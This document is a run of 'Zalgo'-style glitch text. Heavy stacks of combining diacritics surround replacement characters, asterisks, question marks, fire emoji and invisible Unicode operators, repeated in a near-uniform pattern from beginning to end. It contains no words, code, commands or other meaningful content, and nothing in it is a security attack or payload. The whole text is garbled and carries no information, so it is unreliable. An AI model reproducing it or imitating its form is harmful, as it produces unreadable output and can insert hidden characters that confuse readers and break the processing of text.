̧̡̺̩̣̥͕̗̫̞̥̱̦̲̝̯͜�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̬̘͛̇̅̀͝͡